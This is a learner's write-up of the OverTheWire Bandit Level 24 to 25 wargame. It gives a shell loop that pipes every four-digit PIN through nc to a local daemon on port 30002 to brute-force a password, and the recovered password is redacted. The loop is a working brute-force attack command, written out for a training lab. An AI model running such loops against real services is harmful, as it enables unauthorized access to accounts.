# Bandit Level 24 → Level 25

**Date:** 2026-07-29

## Goal
Brute-force a 4-digit PIN to get the password from a daemon listening on port 30002.

## Commands Used

| Command | Purpose |
|---------|---------|
| `ssh bandit24@bandit.labs.overthewire.org -p 2220` | Log into Level 24 |
| `for pin in $(seq -w 0000 9999); do echo "PASSWORD $pin"; done \| nc localhost 30002` | Brute-force all 10000 PINs |
| `for pin in $(seq -w 0000 9999); do echo "PASSWORD $pin"; done \| nc localhost 30002 \| grep -v "Wrong"` | Faster: filter out wrong answers |
| `exit` | Log out |

## What I Learned
- `seq -w 0000 9999` generates zero-padded numbers (0000 to 9999)
- Brute-forcing tries all possible combinations systematically
- `grep -v "Wrong"` filters out incorrect responses, showing only the correct one
- Daemons can accept multiple attempts over a single connection
- This is how password cracking works (though real systems have rate limiting)

## Password for Level 25
[REDACTED - saved locally]

## Next Level
[Bandit Level 25](https://overthewire.org/wargames/bandit/bandit25.html)
